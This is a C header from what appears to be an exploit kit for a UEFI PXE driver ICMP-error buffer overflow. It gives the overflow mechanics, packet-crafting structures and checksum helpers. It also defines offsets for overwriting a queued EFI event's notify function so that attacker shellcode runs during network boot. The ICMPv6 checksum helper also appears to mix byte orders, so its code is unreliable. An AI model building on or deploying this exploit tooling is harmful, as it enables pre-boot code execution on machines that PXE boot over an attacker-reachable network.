/* pxe_layout.h - wire + memory layout for the UefiPxeBcDxe ICMP error overflow
 *
 * CVE-2026-97631  /  GHSA-99cj-7hg9-mp4m
 * NetworkPkg/UefiPxeBcDxe.c : PxeBcIcmpErrorDpcHandle(), PxeBcIcmp6ErrorDpcHandle()
 *
 * During PXE boot the driver keeps a Udp4/Udp6 receive token armed and copies
 * every delivered ICMP error message into a fixed 504-byte member:
 *
 *   typedef struct {
 *     UINT8  Type; UINT8 Code; UINT16 Checksum;
 *     union { ... UINT8 Data[494]; } u;
 *   } EFI_PXE_BASE_CODE_ICMP_ERROR;          // sizeof == 504
 *
 * The copy is bounded against a length that is not the validated ICMP message
 * length (CWE-131), so a longer error message becomes a linear write past
 * &Mode->IcmpError, into whatever the pool allocator placed next.
 *
 * VERIFY THIS against the target's own source before trusting the numbers
 * below: the advisory describes the flawed bound but does not give the exact
 * expression, and the fix (#13302) changes it. Read the two DpcHandle
 * functions in the tree you are testing and confirm what the count is derived
 * from. Everything in this file that depends on it is marked.
 *
 * The corruption is deterministic in direction: any error message longer than
 * 504 bytes writes forward, linearly, with a fixed byte-for-byte mapping from
 * datagram offset to destination offset. That is what makes the primitive
 * usable without a leak - but it also means an oversized message always
 * damages whatever sits after the buffer, so the payload has to put that back.
 *
 * Key consequence for the attacker: the destination of the write is the
 * address of the receive copy itself, i.e.
 *
 *      packet offset i   ->   &Mode->IcmpError + i
 *
 * so the overflow is *position independent*. There is no offset to guess
 * between "where my byte sits in the datagram" and "where it lands in memory".
 * The only unknown is the absolute address of the receive buffer, which is what
 * the shellcode pointer needs (see --pool-base).
 */

#ifndef PXE_LAYOUT_H
#define PXE_LAYOUT_H

#include <stdint.h>
#include <stddef.h>

#if defined(_WIN32)
/* Byte-order helpers.  Deliberately not named htons/htonl: <winsock.h> is
 * pulled in by <windows.h> and would clash. */
static inline uint16_t pxe_htons(uint16_t v)
{
  return (uint16_t)((v >> 8) | (v << 8));
}
static inline uint16_t pxe_ntohs(uint16_t v) { return pxe_htons(v); }
static inline uint32_t pxe_htonl(uint32_t v)
{
  return ((v & 0xff000000u) >> 24) | ((v & 0x00ff0000u) >> 8) |
         ((v & 0x0000ff00u) << 8)  | ((v & 0x000000ffu) << 24);
}
static inline uint32_t pxe_ntohl(uint32_t v) { return pxe_htonl(v); }
#else
#include <arpa/inet.h>
static inline uint16_t pxe_htons(uint16_t v) { return htons(v); }
static inline uint16_t pxe_ntohs(uint16_t v) { return ntohs(v); }
static inline uint32_t pxe_htonl(uint32_t v) { return htonl(v); }
static inline uint32_t pxe_ntohl(uint32_t v) { return ntohl(v); }
#endif

#define PXE_ICMP_ERROR_SIZE   504u   /* sizeof(EFI_PXE_BASE_CODE_ICMP_ERROR) */
#define PXE_ICMP_HDR_SIZE     8u
#define PXE_EMBED_IP_HDR      20u    /* minimal IPv4 header we embed */
#define PXE_EMBED_UDP_HDR     8u

/* Total prologue that must stay a well-formed ICMP error message before we are
 * free to write arbitrary bytes. 8 + 20 + 8 = 36, plus the 8 bytes of the
 * original datagram that the IP layer needs to demultiplex the error to the
 * matching UDP socket: the DHCP transaction id. */
#define PXE_EMBED_ORIG_DATA   8u
#define PXE_GRAFT_START       (PXE_ICMP_HDR_SIZE + PXE_EMBED_IP_HDR + \
                               PXE_EMBED_UDP_HDR + PXE_EMBED_ORIG_DATA)

/* ------------------------------------------------------------------------- *
 * Graft: bytes that land on top of the DXE pool object we want to hijack.
 * Offsets are relative to &Mode->IcmpError and must be measured per build;
 * tools/fw_offsets.py prints the real ones from a debug firmware.
 * ------------------------------------------------------------------------- */

/* Distance from &Mode->IcmpError to the EFI_EVENT we hand to CoreSignalEvent().
 * The advisory describes this as "plant a counterfeit event in the same packet";
 * in practice you corrupt an already-queued event's NotifyFunction/NotifyTpl
 * (or the LIST_ENTRY that CoreSignalEvent walks into it).
 *
 * 504 is only the first byte the overflow can touch. The real offset depends on
 * what the allocator put after Mode, and is measured per build with
 * tools/fw_offsets.py. */
#ifndef GRAFT_EVENT_OFF
#define GRAFT_EVENT_OFF       504u
#endif

/* IEVENT layout, MdeModulePkg/Core/Dxe/Event/Event.h.
 * Verified against edk2-stable202608; older trees reorder these, so the build
 * script asserts them at runtime from the debug symbols. */
#ifndef EVENT_SIGNATURE
#define EVENT_SIGNATURE       0x74766E65u   /* 'evnt' */
#endif
#define EVT_OFF_SIGNATURE     0x00u
#define EVT_OFF_TYPE          0x08u
#define EVT_OFF_SIGNALCOUNT   0x0Cu
#define EVT_OFF_SIGNALLINK    0x10u
#define EVT_OFF_NOTIFYTPL     0x30u
#define EVT_OFF_NOTIFYFN      0x38u
#define EVT_OFF_NOTIFYCTX     0x40u

/* EFI_MEMORY_DESCRIPTOR.Type values used by the dumper. */
#define EfiReservedMemoryType       0
#define EfiLoaderCode               1
#define EfiLoaderData               2
#define EfiBootServicesCode         3
#define EfiBootServicesData         4
#define EfiRuntimeServicesCode      5
#define EfiRuntimeServicesData      6
#define EfiConventionalMemory       7
#define EfiUnusableMemory           8
#define EfiACPIReclaimMemory        9
#define EfiACPIMemoryNVS           10
#define EfiMemoryMappedIO          11
#define EfiMemoryMappedIOPortSpace 12
#define EfiPalCode                 13
#define EfiPersistentMemory        14

#pragma pack(push, 1)

typedef struct {
  uint8_t  type;
  uint8_t  code;
  uint16_t checksum;
  uint32_t unused;          /* rest of the ICMP header for type 3 */
} icmp_err_hdr_t;

typedef struct {
  uint8_t  ver_ihl;
  uint8_t  tos;
  uint16_t tot_len;
  uint16_t id;
  uint16_t frag_off;
  uint8_t  ttl;
  uint8_t  proto;
  uint16_t checksum;
  uint32_t saddr;
  uint32_t daddr;
} ip4_hdr_t;

typedef struct {
  uint16_t sport;
  uint16_t dport;
  uint16_t len;
  uint16_t checksum;
} udp_hdr_t;

/* ICMPv6 error message header (RFC 4443 3.x): same 8-byte shape. */
typedef struct {
  uint8_t  type;
  uint8_t  code;
  uint16_t checksum;
  uint32_t unused;
} icmp6_err_hdr_t;

#pragma pack(pop)

/* IPv6 header, RFC 8200 section 3. */
#pragma pack(push, 1)
typedef struct {
  uint32_t ver_tc_flow;
  uint16_t payload_len;
  uint8_t  next_hdr;
  uint8_t  hop_limit;
  uint8_t  src[16];
  uint8_t  dst[16];
} ip6_hdr_t;
#pragma pack(pop)

#define IP6_HDR_LEN 40u
#define IPPROTO_ICMPV6_N 58u

static inline uint32_t csum_fold(uint32_t sum)
{
  while (sum >> 16)
    sum = (sum & 0xffff) + (sum >> 16);
  return ~sum & 0xffff;
}

static inline uint16_t csum_be(const void *data, size_t len, uint32_t seed)
{
  const uint16_t *p = (const uint16_t *)data;
  uint32_t sum = seed;
  while (len > 1) { sum += *p++; len -= 2; }
  if (len) sum += *(const uint8_t *)p;
  return (uint16_t)csum_fold(sum);
}

/* ICMPv6 pseudo-header: src|dst|len(32bit)|zero(24bit)|nexthdr */
static inline uint16_t icmp6_csum(const uint8_t *msg, size_t len,
                                  const uint8_t src[16], const uint8_t dst[16])
{
  uint32_t sum = 0;
  size_t   i;
  for (i = 0; i < 16; i += 2)
    sum += (uint32_t)(src[i] << 8 | src[i + 1]);
  for (i = 0; i < 16; i += 2)
    sum += (uint32_t)(dst[i] << 8 | dst[i + 1]);
  sum += (uint32_t)((len >> 16) & 0xffff);
  sum += (uint32_t)(len & 0xffff);
  sum += 58; /* IPPROTO_ICMPV6 */
  return csum_be(msg, len, sum);
}

#endif /* PXE_LAYOUT_H */
